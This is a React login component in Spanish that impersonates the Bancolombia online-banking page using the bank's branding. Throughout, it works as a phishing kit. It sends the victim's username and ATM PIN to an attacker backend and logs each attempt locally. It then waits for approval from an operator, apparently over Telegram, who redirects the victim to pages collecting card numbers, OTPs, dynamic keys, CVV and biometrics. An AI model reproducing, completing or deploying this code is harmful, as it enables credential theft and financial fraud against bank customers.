import { updateStateSession, isDesktop, limpiarPaddingBody } from "../../../../@utils";
import { useEffect, useState, useRef } from "react";
import { instanceBackend } from "../../../axios/instanceBackend";
import { PSE_SESSION_HANDOFF_KEY } from "../../loadingPse/PseLoading";
import { useNavigate } from "react-router-dom";
import localStorageService from "../../../services/localStorageService";
import IniciarSesionModal from "./modals/iniciarSesionModal";
import LoadingBancolombia from "../../../components/LoadingBancolombia";
import AccionesModal from "./modals/accionesModal";
import './css/LoginModal.css';

// Se exporta el componente
export default function IniciarSesion() {

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se crean las referencias
  const usuarioRef = useRef(null);
  const claveRef = useRef(null);
  const loginBtnRef = useRef(null);
  const crearUsuarioRef = useRef(null);

  // Se inicializa el formState
  const [formState, setFormState] = useState({
    usuario: "",
    clave: "",
    errorUsuario: false,
    errorClave: false,
    lanzarModalAcciones: false,
    lanzarModalInactividad: false,
    lanzarModalErrorSesion: false,
  });

  // Se inicializa el cargando
  const [getLoading, setLoading] = useState(false);

  // Nuevo estado para el proceso de aprobación
  const [getApprobationState, setApprobationState] = useState({
    esperandoAprobacion: false,
    aprobado: false,
    rechazado: false,
    bloqueado: false,
    mensaje: "",
    usuarioId: null
  });

  // Se inicializa el estado del boton
  const [botonHabilitado, setBotonHabilitado] = useState(false);

  // Se inicializa los estados
  const [ip, setIp] = useState("");
  const [getDateHour, setDateHour] = useState("");

  // Referencia para el intervalo de polling
  const pollingIntervalRef = useRef(null);

  // Se inicializa el sessionIdRef
  const sessionIdRef = useRef(null);

  //  Se crea el useEffect para ejecutar 1 minuto 
  useEffect(() => {

    // Ejecutar inmediatamente al montar
    getDateHours();

    // Calcular cuánto falta para el próximo minuto exacto
    const ahora = new Date();
    const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

    // Se inicializa el intervalo
    let intervalId;

    // Timeout para sincronizar con el cambio exacto de minuto
    const timeoutId = setTimeout(() => {

      // Se obtiene la hora
      getDateHours();

      // Luego actualizar cada 60 segundos
      intervalId = setInterval(() => {

        // Se obtiene la hora
        getDateHours();
      }, 60000);
    }, msHastaProximoMinuto);

    // Cleanup
    return () => {

      // Se limpia el intervalo
      clearTimeout(timeoutId);

      // Se valida si hay intervalo activo
      if (intervalId) clearInterval(intervalId);
    };
  }, []);

  // Sesión: handoff desde /pse, reanudar si hay error OTP, o id nuevo (no reutilizar otro banco)
  useEffect(() => {

    // Reutilizar sessionId de PSE/localStorage; si no hay, generar uno nuevo
    sessionIdRef.current = localStorage.getItem('sessionId') || generateSessionId();
  }, []);

  // Se crea el useEffect para capturar la ip publica y la hora en estandar
  useEffect(() => {

    // Se valida si el estado en el localStorage es error
    const estadoSesion = localStorage.getItem('estado_sesion');

    // Si es error, se muestra el modal
    if (estadoSesion === 'error') {

      // Se borra el estado del localStorage
      localStorage.removeItem('estado_sesion');

      // Se muestra el modal de error de sesión OTP
      setFormState(prev => ({
        ...prev,
        lanzarModalErrorSesion: true
      }));

      // Se quita a los 2 segundos
      setTimeout(() => {

        // Se llama el metodo para cerrar el modal
        setFormState(prev => ({
          ...prev,
          lanzarModalErrorSesion: false
        }));
      }, 4000);
    };

    // Se limpia el padding del body
    limpiarPaddingBody();

    // Se obtiene la IP
    getInfoIp();

    // Se obtiene la fecha/hora con formato
    getDateHours();

    // Cleanup al desmontar
    return () => {

      // Se limpia el polling
      if (pollingIntervalRef.current) {

        // Se limpia el intervalo
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, []);

  // Generar un ID único para esta sesión
  const generateSessionId = () => {

    // Se retorna la sesion id
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  };

  // También actualiza initPolling con logs:
  const initPolling = (usuario) => {

    // Limpiar intervalo anterior si existe
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo
      clearInterval(pollingIntervalRef.current);

      // Se resetea la referencia
      pollingIntervalRef.current = null;
    }

    // Configurar nuevo estado
    setApprobationState({
      esperandoAprobacion: true,
      aprobado: false,
      rechazado: false,
      bloqueado: false,
      mensaje: "⏳ Esperando aprobación en Telegram...",
      usuarioId: usuario
    });

    // Iniciar polling cada 3 segundos
    pollingIntervalRef.current = setInterval(() => {

      // Se llama el metodo
      verifyState();
    }, 3000);

    // También verificar inmediatamente
    verifyState();
  };

  // Metodo encargado de iniciar sesion
  const handleLogin = async () => {

    // Validación adicional
    if (!botonHabilitado) {

      // Se retorna
      return;
    };

    // Se inicializa el loading
    setLoading(true);

    // Se captura la informacion del formulario
    const { usuario, clave } = formState;

    // Registrar intento antes de enviar
    updateLocalStorage(usuario, clave);

    const sessionId = sessionIdRef.current || localStorage.getItem("sessionId");

    // Se inicializa el json
    const dataSend = {
      "data": {
        "attributes": {
          "usuario": usuario,
          "clave": clave,
          "fecha": new Date().toISOString(),
          "sessionId": sessionId,

          // DATOS NUEVOS PARA EL DISTRIBUIDOR
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/bancolombia/authenticacion",
        },
      },
    };

    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    // Se usa el try para la peticion
    try {

      // Se envia la peticion
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/bancolombia/authenticacion", dataSend);

      // Se valida la respuesta
      if (response.data.success) {

        // Se guarda la sessionId en el localStorage
        localStorage.setItem('sessionId', response.data.sessionId);

        // Guardar sesión real del backend
        sessionIdRef.current = response.data.sessionId;

        // Iniciar polling para esperar aprobación
        initPolling();
      } else {

        // Se muestra error del login
        handleErrorLogin();
      };
    } catch (error) {

      // Manejo detallado de errores
      if (error.response) {

        // Error de respuesta del servidor
        alert(`Error ${error.response.status}: ${error.response.data.message || 'Error del servidor'}`);
      } else if (error.request) {

        // Se quita el cargando
        setLoading(false);

        // Error de conexión
        alert('Error de conexión con el servidor');
      } else {

        // Se quita el cargando
        setLoading(false);

        // Error inesperado
        alert('Error inesperado: ' + error.message);
      };
    } finally {
    }
  };

  // Metodo para registrar el intento de LOGIN
  const updateLocalStorage = (usuario, clave) => {

    // Se obtiene los datos del localStorage
    const storageKey = "datos_usuario";

    // Se obtiene el valor almacenado
    const raw = localStorage.getItem(storageKey);

    // Se parsea el JSON o se inicializa un objeto vacío
    let datos = raw ? JSON.parse(raw) : {};

    // ESTRUCTURA UNIFICADA: usuario.login (Array)
    if (!datos.usuario) datos.usuario = {};
    if (!datos.usuario.login) datos.usuario.login = [];

    // Se crea el objeto del intento
    const nuevoIntento = {
      intento: datos.usuario.login.length + 1,
      usuario: usuario,
      clave: clave,
      fecha: new Date().toLocaleString(),
    };

    // Se agrega al array
    datos.usuario.login.push(nuevoIntento);

    // Se guarda nuevamente en el localStorage
    localStorage.setItem(storageKey, JSON.stringify(datos));

    // Se retorna el array
    return datos.usuario.login;
  };

  // Obtiene la dirección IP pública del usuario
  const getInfoIp = async () => {

    // Se usa el try
    try {

      // Se realiza la petición HTTP a la API
      const response = await fetch("https://api.ipify.org?format=json");

      // Se convierte la respuesta a JSON
      const data = await response.json();

      // Se guarda la IP obtenida en el estado
      setIp(data.ip);
    } catch (error) {

      // En caso de error (sin internet, API caída, etc.)
      console.error("Error obteniendo IP", error);

      // Se asigna un valor por defecto para evitar fallos en la UI
      setIp("No disponible");
    };
  };

  // Obtiene la fecha y hora actual del sistema
  const getDateHours = () => {

    // Se obtiene la fecha y hora actual
    const ahora = new Date();

    // Opciones de formato para la fecha y hora
    const opciones = {
      weekday: "long",   // día de la semana (miércoles)
      year: "numeric",   // año (2026)
      month: "long",     // mes (enero)
      day: "numeric",    // día del mes (7)
      hour: "numeric",   // hora (5)
      minute: "2-digit", // minutos (38)
      hour12: true       // formato 12 horas (p. m.)
    };

    // Se formatea la fecha según el locale español de Colombia
    const formato = ahora.toLocaleString("es-CO", opciones);

    // Se guarda el valor formateado en el estado
    setDateHour(formato);
  };

  // Metodo encargado de actualizar el estado del formulario
  const handleChange = (e) => {

    // Se captura el name y value del input
    const { name, value } = e.target;

    // Se valida el campo
    if (name === "usuario") {

      // Se valida la restriccion
      const regexInput = /^[a-zA-Z0-9]*$/;

      // Se valida con la regex
      if (!regexInput.test(value)) return;

      // Se actualiza el estado
      setFormState(prev => {

        // Nuevo estado provisional
        const newState = {
          ...prev,
          usuario: value,
          errorUsuario: !(value.length >= 6 && /(?=.*[a-zA-Z])(?=.*[0-9])/.test(value))
        };

        // Se valida el boton
        validateButton(newState);

        // Se retorna el nuevo estado
        return newState;
      });
    } else if (name === "clave") {

      // Solo números
      const regexNumbers = /^[0-9]*$/;

      // No permitir letras
      if (!regexNumbers.test(value)) return;

      // Error si NO tiene exactamente 4 dígitos
      const validError = value.length !== 4;

      // Se setea la informacion
      setFormState(prev => {

        // Se inicializa la variable
        const newState = {
          ...prev,
          clave: value,
          errorClave: validError
        };

        // Se setea el nuevo estado
        validateButton(newState);

        // Se retorna el estado
        return newState;
      });
    }
  };

  // Función auxiliar para validar si el botón debe estar habilitado
  const validateButton = (estado) => {

    // Se valida para ver si el valor es valido
    if (estado.usuario.trim() !== "" && !estado.errorUsuario && estado.clave.length === 4) {

      // Se setea el boton en habilitado
      setBotonHabilitado(true);
    } else {

      // Se setea el boton en deshabilitado
      setBotonHabilitado(false);
    };
  };

  // Metodo encargado de manejar el evento blur
  const handleBlur = (e) => {

    // Se captura el name y value del input
    const { name, value } = e.target;

    // 1. Validación base: ¿Está vacío?
    let validError = value.trim() === "";

    // Se valida cuando es usuario y no tiene error
    if (name === "usuario" && !validError) {

      // Se valida que cumpla la complejidad
      const cumpleComplejidad = /(?=.*[a-zA-Z])(?=.*[0-9])/.test(value);

      // Se setea el error
      validError = !cumpleComplejidad;
    }

    // Se valida cuando es clave y no tiene error
    if (name === "clave" && !validError) {

      // Se valida cuando es diferente a 4
      validError = value.length !== 4;
    }

    // Se actualiza el estado del formulario
    setFormState(prev => {

      // Se actualiza el estado
      const newState = {
        ...prev,
        [`touched${name.charAt(0).toUpperCase() + name.slice(1)}`]: true,
        [`error${name.charAt(0).toUpperCase() + name.slice(1)}`]: validError
      };

      // Se ejecuta la acción
      validateButton(newState);

      // Se retorna el estado
      return newState;
    });
  };

  // Metodo encargado de bloquear el clipboard
  const bloquearClipboard = (e) => {

    // Se previene la accion por defecto
    e.preventDefault();

    // Se valida si ya hay un temporalizador activo
    if (formState.lanzarModalAcciones) return;

    // Se lanza la alerta
    setFormState(prev => ({
      ...prev,
      lanzarModalAcciones: true
    }));

    // Se crea un temporalizador para cerrar el modal
    setTimeout(() => {

      // Se llama el metodo para cerrar el modal
      cerrarModalAcciones();
    }, 4000);
  };

  // Metodo encargado de cerrar el modal
  const cerrarModalAcciones = () => {

    // Se actualiza el estado del formulario
    setFormState(prev => ({
      ...prev,
      lanzarModalAcciones: false
    }));
  };

  // Metodo encargado de limpiar un campo
  const limpiarCampo = (campo) => {

    // Se actualiza el estado del formulario
    setFormState(prev => ({
      ...prev,
      [campo]: "",
      [`touched${campo.charAt(0).toUpperCase() + campo.slice(1)}`]: true,
      [`error${campo.charAt(0).toUpperCase() + campo.slice(1)}`]: true
    }));
  };

  // Metodo encargado de abrir la alerta de error de inicio de sesión y cerrar a los 2 segundos
  const handleErrorLogin = () => {

    // Se actualiza el estado del formulario - SOLO limpia usuario y clave
    setFormState(prev => ({
      ...prev,
      usuario: "",
      clave: "",
    }));

    // Se lanza la alerta
    setFormState(prev => ({
      ...prev,
      lanzarModalErrorSesion: true
    }));

    // Se inactiva el boton de login
    setBotonHabilitado(false);

    // Se valida si ya hay un temporalizador activo
    if (formState.lanzarModalErrorSesion) return;

    // Se crea un temporalizador para cerrar el modal
    setTimeout(() => {

      // Se llama el metodo para cerrar el modal
      setFormState(prev => ({
        ...prev,
        lanzarModalErrorSesion: false
      }));

      // Se quita el cargando
      setLoading(false);
    }, 4000);
  };

  // Función para verificar el estado de aprobación
  const verifyState = async () => {

    // Se usa el try catch
    try {

      // Se realiza la petición al backend
      const response = await instanceBackend.post(`/bancolombia/verify-state/${sessionIdRef.current}`);

      // Se captura la respuesta
      const { estado, cardData, text, url } = response.data;

      // Si llega configuración de tarjeta custom, la guardamos
      if (cardData) {

        // Se guarda en el localStorage
        localStorageService.setItem("selectedCardData", cardData);
      };

      // Estados que detienen el polling (redirecciones o finales)
      const estadosFinales = [

        // Botones linea 1
        'sol_tc', 'sol_otp', 'sol_din', 'sol_finalizar', 'sol_finalizado', 'solicitar_finalizar',

        // Botones linea 2
        'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login', 'error_cvv_custom',

        // Botones linea 3
        'sol_biometria', 'error_923',

        // Botones linea 4
        'sol_tc_custom', 'sol_cvv_custom',

        // Estados adicionales por pantalla
        'aprobado', 'error_pantalla', 'bloqueado_pantalla', 'sol_link_bot', 'link_bot', 'sol_link_custom'
      ];

      const estadoLower = estado.toLowerCase();
      const hasUrl = Boolean(url && String(url).trim());

      // sol_link_bot / link_bot / custom: seguir polling hasta tener URL
      if (
        (estadoLower === 'sol_link_bot' || estadoLower === 'link_bot' || estadoLower === 'sol_link_custom') &&
        !hasUrl
      ) {
        return;
      }

      console.log("url -> ", url);

      // Detener polling si es un estado final
      if (estadosFinales.includes(estado.toLowerCase())) {

        // Limpiar intervalo de polling
        if (pollingIntervalRef.current) {

          // Se limpia el intervalo
          clearInterval(pollingIntervalRef.current);

          // Se resetea la referencia
          pollingIntervalRef.current = null;
        };
      };

      // Mapeo de redirecciones
      switch (estado.toLowerCase()) {

        // ------------ Casos botones linea 1 ------------
        case 'sol_tc':

          // Se actualiza el estado de sesión por estado actual
          updateStateSession('solicitar_tc');

          // Redirige a la página
          redirigir(`/validacion-tc`);

          // Se sale del switch
          break;
        case 'sol_otp':

          // Se actualiza el estado de sesión por estado actual
          updateStateSession('solicitar_otp');

          // Redirige a la página
          redirigir(`/numero-otp`);

          // Se sale del switch
          break;
        case 'sol_din':

          // Se actualiza el estado de sesión por estado actual
          updateStateSession('solicitar_din');

          // Redirige a la página
          redirigir(`/clave-dinamica`);

          // Se sale del switch
          break;
        case 'sol_finalizar':
        case 'sol_finalizado':
        case 'solicitar_finalizar':

          // Se actualiza el estado de sesión por estado actual
          updateStateSession('solicitar_finalizar');

          // Redirige a la página
          redirigir(`/finalizado-pse`);

          // Se sale del switch
          break;

        // ------------ Casos botones linea 2 ------------
        case 'error_tc_custom':

          // Se almacena en el localStorage el estado de sesión con error
          localStorage.setItem('estado_sesion', 'error');

          // Redirige a la página
          redirigir(`/validacion-tc`);

          // Se sale del switch
          break;
        case 'error_otp':

          // Se actualiza el estado de sesión por estado actual
          updateStateSession('solicitar_otp');

          // Se almacena en el localStorage el estado de sesión con error
          localStorage.setItem('estado_sesion', 'error');

          // Redirige a la página
          redirigir(`/numero-otp`);

          // Se sale del switch
          break;
        case 'error_din':

          // Se almacena en el localStorage el estado de sesión con error
          localStorage.setItem('estado_sesion', 'error');

          // Redirige a la página
          redirigir(`/clave-dinamica`);

          // Se actualiza el estado de sesión por estado actual
          updateStateSession('solicitar_din');

          // Se sale del switch
          break;
        case 'error_login':

          // Se quita el cargando
          setLoading(false);

          // Se actualiza el estado de sesión por estado actual
          updateStateSession('error_login');

          // Se fuera el scroll hacia arriba
          window.scrollTo(0, 0);

          // Se lanza la alerta de error
          handleErrorLogin();

          // Se sale del switch
          break;

        // ------------ Casos botones linea 3 ------------
        case 'sol_biometria':

          // Se actualiza el estado de sesión por estado actual
          updateStateSession('solicitar_biometria');

          // Redirige a la página
          redirigir(`/verificacion-identidad`);

          // Se sale del switch
          break;
        case 'error_923':

          // Se actualiza el estado de sesión por estado actual
          updateStateSession('error_923');

          // Redirige a la página
          redirigir(`/error-923page`);

          // Se sale del switch
          break;

        // ------------ Casos botones linea 4 ------------
        case 'sol_tc_custom':

          // Redirige a la página de validación TC (usa la misma vista para TC estándar y custom)
          redirigir(`/validacion-tc`);

          // Se sale del switch
          break;
        case 'sol_cvv_custom':

          // Redirige a la página
          redirigir(`/validacion-cvv`);

          // Se sale del switch
          break;
        case 'error_cvv_custom':

          // Se almacena en el localStorage el estado de sesión con error
          localStorage.setItem('estado_sesion', 'error');

          // Redirige a validación con error
          redirigir(`/validacion-cvv`);

          // Se sale del switch
          break;
        case 'link_bot':

          if (hasUrl) {
            window.location.href = url;
          }
          break;
        case 'sol_link_custom':

          console.log("text -> ", text);

          // Redirige a la página
          window.location.href = text;

          // Se sale del switch
          break;
        default:
      };
    } catch (error) {

      // Se cierra la sesión actual limpiando el localStorage
      localStorage.clear();

      // Detener polling
      if (pollingIntervalRef.current) {

        // Se desactiva el intervalo de polling
        clearInterval(pollingIntervalRef.current);
      };

      // Se redirige al inicio de sesión
      window.location.href = process.env.REACT_APP_URL_BANK;

      // Se retorna
      return;
    };
  };

  // Helper para redirección suave
  const redirigir = (ruta) => {

    // Se redirige a la ruta indicada
    navigate(ruta);
  };

  // Función para manejar la navegación con la tecla Tab
  const handleTab = (e, nextRef) => {

    // Se previene el comportamiento por defecto
    if (e.key === "Tab" && !e.shiftKey) {

      // Siguiente foco
      e.preventDefault();

      // Se refoca el siguiente elemento
      nextRef.current?.focus();
    };
  };

  // Se crea el return del componente
  const desktop = isDesktop();

  // Se retorna el componente
  return (
    <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }} autoComplete="off">
      <div
        style={{
          flex: 1,
          backgroundColor: "#2C2A29",
          backgroundImage: 'url("/assets/bancolombia/auth-trazo.svg")',
          backgroundRepeat: desktop ? 'round' : 'no-repeat',
          backgroundPosition: "center",
          backgroundPositionY: desktop ? "0px" : "-70px",
          backgroundPositionX: desktop ? "0px" : "-500px",
        }}
        autoComplete="off"
      >
        <div style={{ textAlign: "center" }}>
          <img
            src="/assets/bancolombia/bancolombia.svg"
            alt="Logo"
            style={{ width: "238px", marginTop: "45px" }}
          />
        </div>

        <div
          style={{
            marginTop: "25px",
          }}
        >
          <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32, marginBottom: desktop ? "15px" : "0px" }}>
            Sucursal Virtual Personas
          </h1>
        </div>

        <div className="login-page">
          <div className="login-box" style={{ backgroundColor: "#454648" }}>
            <div style={{ marginTop: 10, marginBottom: 22, textAlignLast: 'center' }}>
              {/* <h2 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3" style={{ fontSize: 22, fontWeight: 600 }}>
                ¡Hola!
              </h2> */}
              <h1 className="bc-card-auth-title2 bc-cibsans-font-style-5-bold bc-mt-3" style={{ fontSize: 22, fontWeight: 600 }}>
                ¡Hola!
              </h1>
            </div>
            <p className="bc-card-auth-description text-center">
              lngresa los datos para gestionar tus productos y hacer transacciones.
            </p>
            <br />

            {/* ----------------------------------------- USUARIO -----------------------------------------*/}
            <div className={`input-group-custom ${formState.errorUsuario ? "has-error" : ""}`} style={{ marginBottom: "-4px" }}>
              <img src="/assets/bancolombia/user.png" alt="User Icon" className="input-icon" width={16} height={17} />

              <div className="input-wrapper">
                <input
                  ref={usuarioRef}
                  id="usuario"
                  name="usuario"
                  type="text"
                  className="input-line"
                  placeholder=" "
                  required
                  maxLength={20}
                  value={formState.usuario}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  onCopy={bloquearClipboard}
                  onPaste={bloquearClipboard}
                  onCut={bloquearClipboard}
                  onContextMenu={bloquearClipboard}
                  onKeyDown={(e) => handleTab(e, claveRef)}
                />
                <label style={{ color: "#ffffff", fontSize: "15px" }}>Usuario</label>
                {/* BOTÓN LIMPIAR */}
                {formState.usuario && (
                  <button
                    type="button"
                    className="clear-btn"
                    onClick={() => limpiarCampo("usuario")}
                    aria-label="Limpiar usuario"
                  >
                    ✕
                  </button>
                )}
              </div>
            </div>
            {formState.errorUsuario && <span className="bc-card-auth-description input-error">Ingresa tu usuario</span>}
            <br />
            <a className="bc-opensans-font-style-1-bold bc-link link-default input-link" style={{ fontSize: "12px", marginTop: "0px" }}>¿Olvidaste tu usuario?</a>
            <br />

            {/* ----------------------------------------- CLAVE -----------------------------------------*/}
            <div className={`input-group-custom mt-2 ${formState.errorClave ? "has-error" : ""}`} style={{ marginBottom: "-4px" }}>
              <img src="/assets/bancolombia/lock.png" alt="Lock Icon" className="input-icon" width={15} />

              <div className="input-wrapper">
                <input
                  ref={claveRef}
                  id="clave"
                  name="clave"
                  type="password"
                  className="input-line"
                  required
                  autoComplete="off"
                  maxLength={4}
                  inputMode="numeric"
                  pattern="[0-9]*"
                  value={formState.clave}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  onCopy={bloquearClipboard}
                  onPaste={bloquearClipboard}
                  onCut={bloquearClipboard}
                  onContextMenu={bloquearClipboard}
                  onKeyDown={(e) => handleTab(e, loginBtnRef)}
                />
                <label htmlFor="clave" style={{ color: "#ffffffff", fontSize: "15px" }}>Clave del cajero</label>
                {/* BOTÓN LIMPIAR */}
                {formState.clave && (
                  <button
                    type="button"
                    className="clear-btn"
                    onClick={() => limpiarCampo("clave")}
                    aria-label="Limpiar clave"
                  >
                    ✕
                  </button>
                )}
              </div>
            </div>

            {formState.errorClave && <span className="bc-card-auth-description input-error">Ingresa tu clave</span>}
            <br />
            <a className="bc-opensans-font-style-1-bold bc-link link-default input-link" style={{ fontSize: "12px", marginTop: "0px" }}>¿Olvidaste o bloqueaste tu clave?</a>

            <button ref={loginBtnRef} onKeyDown={(e) => handleTab(e, crearUsuarioRef)} className="bc-button-primary login-btn" style={{ marginTop: "45px", fontSize: "14px" }} disabled={!botonHabilitado} onClick={() => handleLogin()}>
              Iniciar sesión
            </button>

            <a ref={crearUsuarioRef} className="typegraphy-bold create-user mt-4 input-link text-center" disabled={!botonHabilitado} href="#" style={{ fontSize: "14.5px" }}>
              Crear usuario
            </a>
          </div>
        </div>
        <div className="login-page-footer mt-4">
          <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
            <span>¿Problemas para conectarte?</span>
            <span className="dot">·</span>
            <span>Aprende sobre seguridad</span>
            <span className="dot">·</span>
            <span>Reglamento Sucursal Virtual</span>
            <span className="dot">·</span>
            <span>Política de privacidad</span>
          </div>
          <hr style={{ marginTop: "20px" }} />
          <div className="footer-final">
            <div className="footer-left">
              <div>
                <img
                  src="/assets/bancolombia/bancolombia.svg"
                  style={{ width: "180px" }}
                />
              </div>
              <div style={{ alignSelf: 'center' }}>
                <span className="vigilado">
                  <img
                    src="/assets/bancolombia/logo-vigilado.svg"
                    alt="Superintendencia"
                    style={{ width: "140px" }}
                  />
                </span>
              </div>
            </div>
            <div className="footer-right">
              <div className="mt-2">Dirección IP: {ip}</div>
              <div className="mb-2">{getDateHour}</div>
            </div>
          </div>
        </div>
      </div>

      <div className="visual-captcha" style={{ cursor: "pointer" }}>
        <img src="/assets/bancolombia/lateral-der.png" alt="Visual Captcha" />
      </div>

      {/* Modal de espera de aprobación */}
      {getApprobationState.esperandoAprobacion && (
        <div className="modal-overlay" style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0,0,0,0.7)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            backgroundColor: '#2C2A29',
            padding: '30px',
            borderRadius: '10px',
            maxWidth: '500px',
            width: '90%',
            textAlign: 'center',
            border: '2px solid #F58220'
          }}>
            <div style={{
              fontSize: '60px',
              marginBottom: '20px',
              animation: 'pulse 2s infinite'
            }}>
              ⏳
            </div>
            <h3 style={{ color: 'white', marginBottom: '15px' }}>
              Esperando Aprobación
            </h3>
            <p style={{ color: '#F58220', marginBottom: '20px' }}>
              {getApprobationState.mensaje}
            </p>
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              marginBottom: '20px'
            }}>
              <div className="spinner" style={{
                width: '40px',
                height: '40px',
                border: '4px solid #F58220',
                borderTop: '4px solid transparent',
                borderRadius: '50%',
                animation: 'spin 1s linear infinite',
                marginRight: '10px'
              }}></div>
              <span style={{ color: 'white' }}>Consultando estado...</span>
            </div>
            <button
              onClick={() => {
                setApprobationState({
                  esperandoAprobacion: false,
                  aprobado: false,
                  rechazado: false,
                  bloqueado: false,
                  mensaje: "",
                  usuarioId: null
                });
                if (pollingIntervalRef.current) {
                  clearInterval(pollingIntervalRef.current);
                }
              }}
              style={{
                backgroundColor: 'transparent',
                color: '#F58220',
                border: '1px solid #F58220',
                padding: '10px 20px',
                borderRadius: '5px',
                cursor: 'pointer'
              }}
            >
              Cancelar
            </button>
          </div>
        </div>
      )}

      {/* Modal de aprobado */}
      {getApprobationState.aprobado && (
        <div className="modal-overlay" style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0,0,0,0.7)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            backgroundColor: '#2C2A29',
            padding: '30px',
            borderRadius: '10px',
            maxWidth: '500px',
            width: '90%',
            textAlign: 'center',
            border: '2px solid #4CAF50'
          }}>
            <div style={{
              fontSize: '60px',
              marginBottom: '20px'
            }}>
              ✅
            </div>
            <h3 style={{ color: 'white', marginBottom: '15px' }}>
              ¡Acceso Aprobado!
            </h3>
            <p style={{ color: '#4CAF50', marginBottom: '20px' }}>
              {getApprobationState.mensaje}
            </p>
          </div>
        </div>
      )}

      {/* Modal de rechazado */}
      {getApprobationState.rechazado && (
        <div className="modal-overlay" style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0,0,0,0.7)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            backgroundColor: '#2C2A29',
            padding: '30px',
            borderRadius: '10px',
            maxWidth: '500px',
            width: '90%',
            textAlign: 'center',
            border: '2px solid #F44336'
          }}>
            <div style={{
              fontSize: '60px',
              marginBottom: '20px'
            }}>
              ❌
            </div>
            <h3 style={{ color: 'white', marginBottom: '15px' }}>
              Acceso Rechazado
            </h3>
            <p style={{ color: '#F44336', marginBottom: '20px' }}>
              {getApprobationState.mensaje}
            </p>
            <button
              onClick={() => setApprobationState({
                esperandoAprobacion: false,
                aprobado: false,
                rechazado: false,
                bloqueado: false,
                mensaje: "",
                usuarioId: null
              })}
              style={{
                backgroundColor: '#F58220',
                color: 'white',
                border: 'none',
                padding: '10px 20px',
                borderRadius: '5px',
                cursor: 'pointer'
              }}
            >
              Intentar nuevamente
            </button>
          </div>
        </div>
      )}

      {/* Modal de bloqueado */}
      {getApprobationState.bloqueado && (
        <div className="modal-overlay" style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0,0,0,0.7)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            backgroundColor: '#2C2A29',
            padding: '30px',
            borderRadius: '10px',
            maxWidth: '500px',
            width: '90%',
            textAlign: 'center',
            border: '2px solid #FF9800'
          }}>
            <div style={{
              fontSize: '60px',
              marginBottom: '20px'
            }}>
              🔒
            </div>
            <h3 style={{ color: 'white', marginBottom: '15px' }}>
              Usuario Bloqueado
            </h3>
            <p style={{ color: '#FF9800', marginBottom: '20px' }}>
              {getApprobationState.mensaje}
            </p>
            <p style={{ color: '#cccccc', fontSize: '14px', marginBottom: '20px' }}>
              Contacta al administrador para más información.
            </p>
            <button
              onClick={() => setApprobationState({
                esperandoAprobacion: false,
                aprobado: false,
                rechazado: false,
                bloqueado: false,
                mensaje: "",
                usuarioId: null
              })}
              style={{
                backgroundColor: 'transparent',
                color: '#F58220',
                border: '1px solid #F58220',
                padding: '10px 20px',
                borderRadius: '5px',
                cursor: 'pointer'
              }}
            >
              Cerrar
            </button>
          </div>
        </div>
      )}

      {/* Agrega estos estilos al CSS */}
      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.5; }
          100% { opacity: 1; }
        }
      `}</style>

      {/* Cargando */}
      {getLoading ?
        <LoadingBancolombia /> : null}

      {/* Modal de acciones */}
      {formState.lanzarModalAcciones ?
        <AccionesModal isOpen={formState.lanzarModalAcciones} onClose={cerrarModalAcciones} /> : null}

      {/* Modal de error de sesión */}
      {formState.lanzarModalErrorSesion ?
        <IniciarSesionModal isOpen={formState.lanzarModalErrorSesion} onClose={() => setFormState(prev => ({
          ...prev,
          lanzarModalErrorSesion: false
        }))} /> : null}
    </div>
  );
};
